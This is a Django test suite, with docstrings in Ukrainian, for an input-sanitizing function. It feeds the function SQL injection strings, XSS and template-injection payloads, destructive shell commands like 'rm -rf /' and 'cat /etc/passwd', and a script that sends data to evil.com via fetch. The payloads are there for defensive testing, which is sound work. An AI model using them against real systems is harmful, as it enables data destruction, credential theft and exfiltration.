from django.core.exceptions import ValidationError
from django.test import TestCase

from common.utils.sanitize_input import sanitize_input


class TestSanitizeInput(TestCase):
    """Тести для функції sanitize_input"""

    def test_none_and_empty_input(self):
        """Тест обробки None та порожніх значень"""
        self.assertIsNone(sanitize_input(None))
        self.assertIsNone(sanitize_input(''))
        self.assertEqual(sanitize_input('   '), '')

    def test_basic_string_sanitization(self):
        """Тест базової санітизації рядків"""
        self.assertEqual(sanitize_input('Hello World'), 'Hello World')
        self.assertEqual(sanitize_input('  Hello   World  '), 'Hello World')

    def test_html_tags_removal(self):
        """Тест видалення HTML тегів"""
        self.assertEqual(sanitize_input('<p>Hello</p>'), 'Hello')
        self.assertEqual(sanitize_input('<div><span>Test</span></div>'), 'Test')
        result = sanitize_input('<script>alert("hack")</script>')
        self.assertEqual(result, 'alert&quot;hack&quot;')

    def test_html_entities_escaping(self):
        """Тест екранування HTML сутностей"""
        self.assertEqual(sanitize_input('5 > 3 & 2 < 4'), '5 &gt; 3 2 &lt; 4')
        self.assertEqual(sanitize_input('"quotes"'), '&quot;quotes&quot;')
        self.assertEqual(sanitize_input("'single'"), '&#x27;single&#x27;')

    def test_unicode_normalization(self):
        """Тест нормалізації Unicode"""
        self.assertEqual(sanitize_input('ﬁ'), 'fi')
        self.assertEqual(sanitize_input('①'), '1')

    def test_control_characters_removal(self):
        """Тест видалення контрольних символів"""
        test_string = 'Hello\x00\x01\x02World'
        result = sanitize_input(test_string)
        self.assertEqual(result, 'HelloWorld')

    def test_dangerous_characters_removal(self):
        """Тест видалення небезпечних символів"""
        safe_dangerous_chars = [';', '|', '&', '`', '(', ')', '*', '\\']
        for char in safe_dangerous_chars:
            result = sanitize_input(f'test{char}hello')
            self.assertNotIn(char, result)

    def test_dangerous_dollar_character(self):
        """Окремий тест для символу $, який може викликати NoSQL перевірку"""
        result = sanitize_input('test$hello')
        self.assertNotIn('$', result)
        self.assertEqual(result, 'testhello')

    def test_nosql_injection_detection(self):
        """Тест виявлення NoSQL ін'єкцій"""
        nosql_patterns = ['$where', '$ne', '$gt', '$lt', '$regex', '$or', '$and', '$exists', '$in', '$nin']

        for pattern in nosql_patterns:
            with self.assertRaises(ValidationError) as cm:
                sanitize_input(f'user {pattern} malicious')
            self.assertIn('NoSQL injection pattern detected', str(cm.exception))

    def test_sql_injection_removal(self):
        """Тест видалення SQL ін'єкцій"""
        sql_attacks = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "UNION SELECT * FROM passwords",
            "DELETE FROM users WHERE 1=1",
            "INSERT INTO logs VALUES ('hack')",
            "UPDATE users SET role='admin'",
            "ALTER TABLE users ADD COLUMN hack",
            "CREATE TABLE temp AS SELECT *",
            "TRUNCATE TABLE logs",
            "/* comment attack */",
            "-- comment attack"
        ]

        for attack in sql_attacks:
            result = sanitize_input(attack)
            dangerous_patterns = ['drop table', 'delete from', 'insert into', 'update', 'union select']
            for pattern in dangerous_patterns:
                self.assertNotIn(pattern, result.lower())

    def test_xss_attack_removal(self):
        """Тест видалення XSS атак"""
        xss_attacks = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            'data:text/html,<script>alert("xss")</script>',
            'vbscript:msgbox("xss")',
            '<img onerror="alert(1)" src="x">',
            '<div onclick="alert(1)">click</div>',
            'eval("malicious code")',
            'exec("rm -rf /")'
        ]

        for attack in xss_attacks:
            result = sanitize_input(attack)
            self.assertNotIn('javascript:', result.lower())
            self.assertNotIn('vbscript:', result.lower())
            self.assertNotIn('onerror', result.lower())
            self.assertNotIn('onclick', result.lower())

    def test_template_injection_removal(self):
        """Тест видалення template ін'єкцій"""
        template_attacks = [
            '${java:os}',
            '{{7*7}}',
            '<%=system("ls")%>',
            '{% for item in items %}hack{% endfor %}'
        ]

        for attack in template_attacks:
            result = sanitize_input(attack)
            self.assertNotIn('{{', result)
            self.assertNotIn('<%=', result)
            self.assertNotIn('{%', result)

    def test_system_command_removal(self):
        """Тест видалення системних команд"""
        system_attacks = [
            'rm -rf /',
            'del /q /f *.*',
            'format c:',
            'shutdown -h now',
            'reboot',
            'cat /etc/passwd'
        ]

        for attack in system_attacks:
            result = sanitize_input(attack)
            self.assertNotIn('rm -rf', result.lower())
            self.assertNotIn('del /', result.lower())
            self.assertNotIn('format', result.lower())
            self.assertNotIn('shutdown', result.lower())
            self.assertNotIn('reboot', result.lower())

    def test_complex_mixed_attack_without_nosql(self):
        """Тест складних змішаних атак без NoSQL патернів"""
        complex_attack = '''
        <script>
        var x = "'; DROP TABLE users; --";
        fetch('evil.com' + x);
        eval('rm -rf /');
        </script>
        {{7*7}}
        '''

        result = sanitize_input(complex_attack)

        self.assertNotIn('drop table', result.lower())
        self.assertNotIn('{{', result)
        self.assertNotIn('rm -rf', result.lower())

    def test_legitimate_content_preservation(self):
        """Тест збереження легітимного контенту"""
        legitimate_inputs = [
            'Іван Петренко',
            'email@example.com',
            'Київська область, м. Київ',
            'Програміст Python/Django',
            'Текст з цифрами 123 та символами !@#',
            'Багаторядковий\nтекст\nз переносами'
        ]

        for input_text in legitimate_inputs:
            result = sanitize_input(input_text)
            self.assertTrue(len(result) > 0)
            dangerous_chars = [';', '|', '`', '$', '(', ')', '*', '\\']
            for char in dangerous_chars:
                self.assertNotIn(char, result)

    def test_case_insensitive_detection(self):
        """Тест регістронезалежного виявлення атак"""
        case_variants = [
            'DROP table users',
            'drop TABLE users',
            'DrOp TaBlE users',
            'SELECT * FROM users',
            'select * from users',
            'SeLeCt * FrOm users'
        ]

        for variant in case_variants:
            result = sanitize_input(variant)
            self.assertNotIn('drop', result.lower())
            self.assertNotIn('select', result.lower())
            self.assertNotIn('from', result.lower())

    def test_whitespace_normalization(self):
        """Тест нормалізації пробілів"""
        inputs_with_spaces = [
            '  multiple   spaces   between   words  ',
            '\t\ttabs\t\tand\t\tspaces\t\t',
            '\n\rnewlines\n\rand\r\nreturns\n\r',
            '   \t\n  mixed   \t\n  whitespace  \t\n   '
        ]

        for input_text in inputs_with_spaces:
            result = sanitize_input(input_text)
            self.assertNotIn('  ', result)
            self.assertEqual(result, result.strip())

    def test_integer_input(self):
        """Тест обробки числових типів"""
        self.assertEqual(sanitize_input(12345), '12345')
        self.assertEqual(sanitize_input(0), '0')
        self.assertEqual(sanitize_input(-123), '-123')

    def test_boolean_input(self):
        """Тест обробки boolean значень"""
        self.assertEqual(sanitize_input(True), 'True')
        self.assertEqual(sanitize_input(False), 'False')

    def test_float_input(self):
        """Тест обробки float значень"""
        self.assertEqual(sanitize_input(123.45), '123.45')
        self.assertEqual(sanitize_input(-67.89), '-67.89')

    def test_specific_nosql_patterns_that_cause_errors(self):
        """Тест конкретних NoSQL патернів, які викликають помилки"""
        patterns_that_raise = ['$where', '$in']
        for pattern in patterns_that_raise:
            with self.assertRaises(ValidationError):
                sanitize_input(f'test {pattern} hello')

    def test_dollar_in_middle_of_words(self):
        """Тест символу $ в середині слів, що не викликає NoSQL помилку"""
        safe_dollar_inputs = [
            'price$value',
            'test$data',
            'name$field',
            'user$id'
        ]

        for input_text in safe_dollar_inputs:
            try:
                result = sanitize_input(input_text)
                self.assertNotIn('$', result)
            except ValidationError:
                self.fail(f"Unexpected NoSQL detection in '{input_text}'")
